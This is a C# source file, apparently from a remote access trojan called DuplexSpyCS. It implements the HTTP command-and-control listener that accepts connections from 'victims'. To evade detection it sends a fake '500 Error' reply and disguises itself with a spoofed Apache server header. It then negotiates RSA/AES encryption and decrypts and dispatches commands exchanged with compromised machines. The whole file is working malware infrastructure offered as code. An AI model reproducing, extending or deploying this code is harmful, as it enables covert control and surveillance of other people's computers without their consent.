using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public class clsHttpListener : clsListener
    {
        private TcpListener m_listener { get; set; }
        private CancellationTokenSource m_cts { get; set; }

        private List<clsVictim> m_lsVictim = new List<clsVictim>();
        public List<clsVictim> Victims { get { return m_lsVictim; } }

        public clsHttpListener(string szName, int nPort, string szDescription)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_protocol = enListenerProtocol.HTTP;

            m_listener = new TcpListener(IPAddress.Any, nPort);
            m_cts = new CancellationTokenSource();

            m_bIslistening = false;
        }

        public class clsHttpResp
        {
            private string m_szStateCode = "200 OK";
            private string m_szBody { get; init; }

            public clsHttpResp()
            {
                m_szBody = string.Empty;
            }

            public clsHttpResp(int nCmd, int nParam, string szMsg)
            {
                clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
                m_szBody = Convert.ToBase64String(dsp.GetBytes());
            }

            public clsHttpResp(int nCmd, int nParam, byte[] abMsg)
            {
                clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, abMsg);
                m_szBody = Convert.ToBase64String(dsp.GetBytes());
            }

            public clsHttpResp(string szStateCode, string szMsg)
            {
                m_szStateCode = szStateCode;
                m_szBody = szMsg;
            }

            public byte[] fnGetBytes() => fnGetBytes(m_szBody);
            public byte[] fnGetBytes(byte[] abBuffer) => fnGetBytes(Convert.ToBase64String(abBuffer));
            public byte[] fnGetBytes(string szMsg)
            {
                string szResp = $"" +
                    $"HTTP/1.1 {m_szStateCode}\r\n" +
                    $"Server: Apache/1.3.27\r\n" +
                    $"Content-Type: text/html\r\n" +
                    $"content-length: {m_szBody.Length}\r\n\r\n" +
                    $"{m_szBody}";

                return Encoding.UTF8.GetBytes(szResp);
            }

            public byte[] fnGetBytes(int nCmd, int nParam, string szMsg)
            {
                clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
                return fnGetBytes(dsp.GetBytes());
            }
        }

        ~clsHttpListener() => fnStop();

        public override void fnStart()
        {
            try
            {
                Socket sktSrv = m_listener.Server;
                var hSafe = sktSrv.SafeHandle;
                if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                    m_listener = new TcpListener(IPAddress.Any, m_nPort);

                m_listener.Start();
                _ = Task.Run(() => fnAcceptLoop(m_cts.Token));
                m_bIslistening = true;

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public override void fnStop()
        {
            if (!m_bIslistening)
                return;

            try
            {
                m_cts.Cancel();
                m_listener.Stop();
                m_bIslistening = false;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnStop()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async Task fnAcceptLoop(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested && m_bIslistening)
            {
                try
                {
                    var client = await m_listener.AcceptTcpClientAsync();
                    _ = Task.Run(() => fnHandleClient(client), ct);
                }
                catch (ObjectDisposedException) { break; }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Accept error: {ex.Message}");
                }
            }
        }

        private async Task fnHandleClient(TcpClient client)
        {
            using (client)
            {
                NetworkStream stream = client.GetStream();
                clsVictim victim = new clsVictim(this, client.Client);

                m_lsVictim.Add(victim);

                var s = clsCrypto.CreateRSAKey();
                string szRsaPublicKey = s[0];
                string szRsaPrivateKey = s[1];

                victim.key_pairs = (szRsaPublicKey, szRsaPrivateKey);

                //Fake response.
                victim.Send(new clsHttpResp("500 Error", "HTTP 500://Server internal error.").fnGetBytes());

                //Send RSA public key.
                victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(szRsaPublicKey)).fnGetBytes());

                while (m_bIslistening)
                {
                    try
                    {
                        if (!client.Connected)
                            break;

                        var (header, bodyBytes) = await fnReadHttpPacket(stream);
                        if (bodyBytes.Length == 0)
                            return;

                        clsStore.recv_bytes += header.Length + bodyBytes.Length;

                        string szBody = Encoding.UTF8.GetString(bodyBytes);
                        byte[] abBody = Convert.FromBase64String(szBody);
                        if (abBody.Length == 0)
                            continue;

                        clsDSP dsp = new clsDSP(abBody);
                        var headerInfo = clsDSP.GetHeader(abBody);
                        var msg = dsp.GetMsg();
                        int nCmd = headerInfo.cmd;
                        int nParam = headerInfo.para;
                        byte[] abMsg = dsp.GetMsg().msg;

                        if (nCmd == 0)
                        {
                            if (nParam == 0)
                            {
                                //todo: disconnect
                            }
                        }
                        else if (nCmd == 1)
                        {
                            if (nParam == 0)
                            {
                                
                                
                            }
                            else if (nParam == 1)
                            {
                                byte[] abEncAesData = Convert.FromBase64String(Encoding.UTF8.GetString(abMsg));
                                byte[] abPlainData = clsCrypto.RSADecrypt(abEncAesData, victim.key_pairs.private_key);
                                string szPlainData = Encoding.UTF8.GetString(abPlainData);

                                string[] asAesData = szPlainData.Split('|');

                                byte[] abKey = Convert.FromBase64String(asAesData.First());
                                byte[] abIV = Convert.FromBase64String(asAesData.Last());

                                victim._AES.key = abKey;
                                victim._AES.iv = abIV;

                                string szChallenge = clsEZData.fnGenerateRandomStr();
                                victim.challenge_text = szChallenge;

                                string szCipher = clsCrypto.AESEncrypt(szChallenge, abKey, abIV);
                                victim.Send(new clsHttpResp(1, 2, szCipher).fnGetBytes());
                            }
                            else if (nParam == 3)
                            {
                                string enc_data = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(abMsg)), victim._AES.key, victim._AES.iv);
                                string payload = Encoding.UTF8.GetString(clsCrypto.RSADecrypt(Convert.FromBase64String(enc_data), victim.key_pairs.private_key));

                                if (string.Equals(payload, victim.challenge_text))
                                {
                                    victim.Send(new clsHttpResp(1, 4, clsEZData.fnGenerateRandomStr()).fnGetBytes());
                                }
                            }
                        }
                        else if (nCmd == 2)
                        {
                            if (nParam == 0)
                            {
                                string dec_data = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(abMsg)), victim._AES.key, victim._AES.iv);
                                string[] cmd = dec_data.Split("|");

                                try
                                {
                                    fnReceivedDecoded(this, victim, cmd.ToList());
                                }
                                catch (InvalidOperationException)
                                {

                                }

                                var pkt = victim.fnGetResponse();
                                byte[] abBuffer = pkt.fnGetBytes();
                                victim.Send(abBuffer);

                                clsStore.sent_bytes += abBuffer.Length;
                            }
                        }
                    }
                    catch (ObjectDisposedException)
                    {
                        break;
                    }
                    catch (Exception ex)
                    {
                        //MessageBox.Show(ex.Message);
                    }
                }

                fnDisconnected(victim);
                m_lsVictim.Remove(victim);
            }
        }

        private async Task<(string header, byte[] body)> fnReadHttpPacket(NetworkStream stream)
        {
            byte[] buffer = new byte[4096];
            MemoryStream headerStream = new MemoryStream();

            while (true)
            {
                int read = await stream.ReadAsync(buffer, 0, buffer.Length);
                if (read <= 0)
                    throw new Exception("Client disconnected");

                headerStream.Write(buffer, 0, read);

                string temp = Encoding.ASCII.GetString(headerStream.ToArray());
                int idx = temp.IndexOf("\r\n\r\n", StringComparison.Ordinal);
                if (idx >= 0)
                {
                    byte[] all = headerStream.ToArray();
                    byte[] headerBytes = all[..(idx + 4)];
                    byte[] remain = all[(idx + 4)..];

                    string header = Encoding.ASCII.GetString(headerBytes);

                    int contentLength = 0;
                    foreach (string line in header.Split("\r\n"))
                    {
                        if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
                        {
                            int.TryParse(line.Substring(15).Trim(), out contentLength);
                        }
                    }

                    byte[] body = new byte[contentLength];
                    int copied = Math.Min(remain.Length, contentLength);
                    Array.Copy(remain, 0, body, 0, copied);

                    int offset = copied;
                    while (offset < contentLength)
                    {
                        int r = await stream.ReadAsync(body, offset, contentLength - offset);
                        if (r <= 0)
                            throw new Exception("Unexpected EOF while reading body");
                        offset += r;
                    }

                    return (header, body);
                }
            }
        }

    }
}
